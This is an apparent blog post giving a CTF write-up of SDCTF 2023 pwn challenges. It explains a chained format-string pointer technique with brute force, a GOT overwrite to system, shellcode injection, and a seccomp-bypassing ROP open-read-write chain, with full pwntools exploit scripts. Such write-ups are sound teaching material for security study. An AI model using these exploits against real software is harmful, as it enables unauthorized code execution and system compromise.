@@ -1,0 +1,269 @@
+---
+title: "SDCTF 2023 Writeup"
+date: "2023-05-07"
+tags: ['Writeup', 'Pwn']
+draft: false
+summary: "The money-printer-2 challenge is a really interesting format string challenge. It shows a cool fmt exploit technique that leverages chained pointer and brute forcing which I haven't seen before."
+---
+
+The money-printer-2 challenge is a really interesting format string challenge. It shows a cool fmt exploit technique that leverages chained pointer and brute forcing which I haven't seen before.
+
+
+
+## Pwn
+
+### money-printer-2
+
+The most interesting pwn challenge of the SDCTF this year is this one.
+
+![print-money-2](/static/images/SDCTF-2023-Writeup/print-money-2.png)
+
+What can you achieve with just a one-time fmt vulnerability under the following conditions?
+
+1. No additional information leaks in the program.
+2. The vulnerable format string call is located at the end of the main function, which does not invoke any other functions from the GOT table afterward.
+3. The binary is safeguarded by `partial RELRO`, rendering the `.fini_array` read-only and preventing us from hijacking the exit process.
+4. The binary is protected by a canary; we can call the `canary_chk_fail` function in the GOT table, but we must first pollute the canary.
+
+Our objective is to manipulate the format string vulnerability to gain control over the program flow. Given the constraints, it appears we must overwrite the main function's return address or the canary, both of which are on the stack.
+
+In a standard format string payload, we insert the desired address into the buffer, determine its argument order, and employ `%??$lln` to write the value. However, with an unknown stack address, we must resort to utilizing existing pointers on the stack that we can control and direct to the target location.
+
+In most instances, the existing pointer does not lead to our intended address. As the format string write payload can only write up to 8 bytes, we need to explore another technique known as the `chained format string pointer`.
+
+**chained fmt pointer + brute force**
+
+Assuming our target address is the return address of the main function, situated at `rbp+8`, we lack a direct pointer. Consequently, our initial task is to identify a stack pointer (`ptr1`) that points to another stack pointer (`ptr2`)  whose pointing address differs from our target address only in the last 2 bytes (or possibly 12 bits). Then we first leverage that stack pointer `ptr1` to overwrite the last 2 bytes of our stack pointer `ptr2`, making it has the possibility to point to the ret address. Finally, we use the second pointer `ptr2` to overwrite our target address.
+
+![money-printer-2](/static/images/SDCTF-2023-Writeup/money-printer-2.png)
+
+The payload may appear as follows:
+
+```
+offset = 0x2e98 # a randomly chosen offset
+# payload = f'%{offset}c%25$hn' # THIS WILL NOT WORK!!!
+payload = '%c'*23 + f'%{offset-23}c%hn' 
+payload += f'%{main_addr-offset}c%51$lln'
+sh.sendline(payload.encode())
+```
+
+However, it is crucial to note that in our first write, we cannot utilize the `%XX$hn` format as this will cause our second write to use the original address instead of our modified one. This occurs because the internal mechanism of `printf` replaces all the index arguments in the format string at once when encountering the first `%XX$hn` format. At that moment, the 51st argument's location still contains the original value, which has not yet been overwritten.
+
+By using this chained pointer, we could overwrite the ret address which allows us to hijack the control flow. But the success chance might be slight, 1/65536.
+
+Plus, we can only overwrite the `printf@got` to `system@plt` and send `/bin/sh\x00` in the next fgets. This will allow us to get the shell when the next `printf` has been called.
+
+```
+"""
+Solution:
+    1/ interger underflow to get the printf vuln
+    use the one-time fmt(chained fmt)):
+        2/ overwrite the last of bytes the existing pointer on the stack to make it point to the ret addr of main (brute force)
+        2/ use our particially overwrited pointer to overwrite the ret addr to the address of (gets+printf)
+        2/ overwrite the printf@got to system@plt
+
+Some info:   
+    printf payload should less than 0x64 bytes
+    our input starts from argument $7
+
+Key insight:
+    in this challenge, we cannot leak the stack addr before the fmt vuln
+    so instead of arbitrary address write with fmt, we need to the existing ptr on the stack, especially a ptr to the another stack addr
+    and the existing ptr didn't point to place (canary or ret's addr of a=main), cannot modify the last byte of it and try burteforce!!!
+"""
+
+def integer_underflow(sh):
+    sh.recvuntil(b"how many of them do you want?")
+    sh.sendline(b"-1001")
+    sh.recvuntil(b'Is there anything you would like to say to the audience?')
+
+
+system_plt_addr = binary.plt['system'] # 0x4006b0
+printf_got_addr = binary.got['printf'] # 0x601038
+main_addr = binary.symbols['main']
+
+def exploit(sh):
+    """ 
+        chained fmt:
+        1/ find a existing ptr on the stack that points to the another stack addr near the ret addr of main
+        2/ leverging the existing ptr to overwrite the pointed stack addr to the ret addr of main (bruteforce)
+        leverage the ptr on rbp+0x18 which points to the rbp+0xe8
+
+        3/ overwrite the printf@got to system@plt
+
+    """
+    integer_underflow(sh)
+
+    offset = 0x2e98
+    payload = '%c'*23 + f'%{offset-23}c%hn' # watchout the %25$hn will not work!!! 
+    # payload = f'%{offset}c%25$hn' # THIS WILL NOT WORK!!!
+    payload += f'%{system_plt_addr-offset}c%19$lln'
+    payload += f'%{main_addr-system_plt_addr}c%51$lln'
+    payload += 'A'*(0x58-len(payload)) + p64(printf_got_addr).decode()
+    sh.sendline(payload.encode())
+    
+    log.info(sh.recvuntil(b'how many of them do you want?'))
+    sh.sendline(b"-1001")
+    sh.recvuntil(b'Is there anything you would like to say to the audience?')
+
+    success("We got the shell!!!!")
+    sh.sendline(b"/bin/sh")
+    sh.recvuntil(b"wow you said: ")
+
+    sh.sendline(b"cat ./flag.txt")
+    sh.sendline(b"ls -al")
+    log.info(sh.recv())
+    log.info(sh.recv())
+    log.info(sh.recv())
+    sh.interactive()
+    
+
+
+def run_exploit(i):
+    log.info(f"Trying {i} times...")
+    try:
+        sh = start()
+        exploit(sh)
+        return True
+    except Exception as e:
+        sh.close()
+        return False
+
+
+if __name__ == "__main__":
+    max_threads = 8
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
+        results = [executor.submit(run_exploit, i) for i in range(5000)]
+        
+        for future in concurrent.futures.as_completed(results):
+            if future.result():
+                break
+```
+
+
+
+### turtle-shell
+
+This challenge allows us to inject a piece of shellcode that doesn't contain `\xb0\x3b`. Luckily, the shellcode generated by the pwntools is already satisfied.
+
+```
+shellcode = asm(shellcraft.amd64.linux.sh())
+sh.recvuntil(b"Say something to make the turtle come out of its shell")
+log.info(f"shellcode has length: {len(shellcode)}")
+log.info(f"shellcode: {shellcode}")
+sh.sendline(shellcode)
+```
+
+![turtle-1](/static/images/SDCTF-2023-Writeup/turtle-1.png)
+
+
+
+### tROPic-thunder
+
+The binary provided by this challenge has a stack overflow vulnerability, however, the binary is protected by the `seccomp` sandbox.
+
+```
+void setup_seccomp(void)
+
+{
+  uint uVar1;
+  uint uVar2;
+  uint uVar3;
+  undefined8 uVar4;
+  
+  uVar4 = seccomp_init(0x7fff0000);
+  uVar1 = seccomp_rule_add(uVar4,0,0x3b,0);
+  uVar2 = seccomp_rule_add(uVar4,0,0x142,0);
+  uVar3 = seccomp_load(uVar4);
+  if ((uVar1 | uVar2 | uVar3) != 0) {
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  return;
+}
+```
+
+Since it only banned `execve` and `execveat` syscall. Therefore, we can use ORW to get the flag.
+
+```
+def exploit(i):
+    sh = start()
+
+    # Padding for the stack overflow
+    padding = b"A" * 0x78  # Adjust this value based on the target binary
+
+    # ROP chain
+    rop = ROP(binary)
+    rop.raw(padding)
+
+    # read syscall to read the filename to the filename_addr
+    rop.raw(pop_rax)
+    rop.raw(0)  # syscall number for read
+    rop.raw(pop_rdi)
+    rop.raw(0)  # file descriptor for stdin
+    rop.raw(pop_rsi)
+    rop.raw(0x0)  # file descriptor for stdin
+    rop.raw(pop_rdx)
+    rop.raw(filename_addr)  # Address of the filename in the .bss section
+    # rop.raw(ret)
+    rop.raw(binary.symbols["syscall"])  # syscall
+
+    # open syscall
+    rop.raw(pop_rdi)
+    rop.raw(2)  # syscall number for open
+    rop.raw(pop_rsi)
+    rop.raw(filename_addr)
+    set_rcx(rop, 0x0)
+    rop.raw(ret)
+    rop.raw(pop_rdx)
+    rop.raw(0x0)  # flag
+    # rop.raw(ret)  # Stack alignment
+    rop.raw(binary.symbols["syscall"])  # syscall with number 2 in rax
+
+    # read syscall
+    rop.raw(pop_rdi)
+    rop.raw(0)  # syscall number for read
+    rop.raw(pop_rsi)
+    rop.raw(3) # file descriptor for stdin
+    rop.raw(pop_rdx)
+    rop.raw(content_addr)  # Buffer address (change the offset if needed)
+    rop.raw(binary.symbols["syscall"])  # syscall with number 0 in rax
+
+    # puts the content or use the write syscall
+    rop.raw(pop_rdi)
+    rop.raw(content_addr)
+    rop.raw(binary.symbols["puts"])
+    rop.raw(ret)
+
+    # write syscall
+    # rop.raw(pop_rdi)
+    # rop.raw(1)  # syscall number for write
+    # rop.raw(pop_rsi)
+    # rop.raw(1) # file descriptor for stdout
+    # rop.raw(pop_rdx)
+    # rop.raw(content_addr)  # Buffer address (change the offset if needed)
+    # rop.raw(ret)
+    # rop.raw(binary.symbols["syscall"])  # syscall with number 1 in rax
+
+    # Send the payload
+    sh.recvline(b"you'll really be in the jungle with this one!\n")
+    sh.sendline(rop.chain()+b'\x00'*(i-len(rop.chain())))
+
+    # sh.recvline(b"you'll really be in the jungle with this one!")
+    sh.sendline(filename)
+
+    # Print the received data
+    print(sh.recv())
+
+    # Close the process
+    sh.interactive()
+```
+
+![tROP-1](/static/images/SDCTF-2023-Writeup/tROP-1.png)
+
+### **money-printer**-1
+
+The binary firstly has an integer underflow which will lead to an fmt vulnerability. Since the binary also read the flag to the stack, we can leverage the fmt to print that content out.
+
+![print-money-1](/static/images/SDCTF-2023-Writeup/print-money-1.png)
+
